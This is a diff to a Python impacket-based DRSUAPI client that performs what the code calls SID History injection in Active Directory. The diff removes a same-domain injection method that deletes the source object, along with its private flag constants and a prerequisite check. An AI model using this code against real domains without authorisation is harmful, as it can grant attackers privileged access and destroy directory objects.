@@ -17,22 +17,13 @@ from typing import Optional, Tuple
 try:
     from impacket.dcerpc.v5 import drsuapi, transport, epm
     from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NDRUNION, NDRUniConformantArray, NULL
-    from impacket.dcerpc.v5.dtypes import (
-        DWORD, LPWSTR, ULONG, WSTR, LONG, NDRPOINTERNULL
-    )
+    from impacket.dcerpc.v5.dtypes import DWORD, LPWSTR
     from impacket.dcerpc.v5.rpcrt import (
         RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
     )
-    from impacket.uuid import uuidtup_to_bin
     HAS_IMPACKET = True
 except ImportError:
     HAS_IMPACKET = False
-
-
-# ─── FLAGS ────────────────────────────────────────────────────────────────
-
-DS_ADDSID_FLAG_PRIVATE_CHK_SECURE  = 0x40000000
-DS_ADDSID_FLAG_PRIVATE_DEL_SRC_OBJ = 0x80000000
 
 
 # ─── NDR STRUCTURES ──────────────────────────────────────────────────────
@@ -299,7 +290,7 @@ class DRSUAPIClient:
             src_creds_user: Username for source domain auth
             src_creds_domain: Domain for source domain auth
             src_creds_password: Password for source domain auth
-            flags: DRS_ADDSID_FLAGS (0=cross-forest, DEL_SRC_OBJ=same-domain)
+            flags: DRS_ADDSID_FLAGS (0=cross-forest)
 
         Returns:
             Tuple of (success, win32_error, error_message)
@@ -375,24 +366,6 @@ class DRSUAPIClient:
 
             return False, -1, error_str
 
-    def add_sid_history_same_domain(self, src_dn: str, dst_dn: str) -> Tuple[bool, int, str]:
-        """
-        Same-domain SID History injection using DS_ADDSID_FLAG_PRIVATE_DEL_SRC_OBJ.
-
-        WARNING: This DELETES the source object and copies its SID(s) to the destination.
-        """
-        if not self._hDrs:
-            return False, -1, "Not connected (DRSBind required)"
-
-        logging.debug(f"Calling DRSAddSidHistory (DEL_SRC_OBJ): {src_dn} -> {dst_dn}")
-        logging.warning("This will DELETE the source object!")
-
-        return self.add_sid_history(
-            src_domain=self.domain, src_principal=src_dn,
-            dst_domain=self.domain, dst_principal=dst_dn,
-            flags=DS_ADDSID_FLAG_PRIVATE_DEL_SRC_OBJ
-        )
-
     def disconnect(self):
         """Unbind and disconnect from DRSUAPI."""
         try:
@@ -438,12 +411,3 @@ class DRSUAPIClient:
         }
         return errors.get(code, f"Unknown error (code {code})")
 
-    @staticmethod
-    def check_prerequisites():
-        """Check if all prerequisites for DRSUAPI are met."""
-        issues = []
-
-        if not HAS_IMPACKET:
-            issues.append("impacket is not installed (pip install impacket)")
-
-        return issues
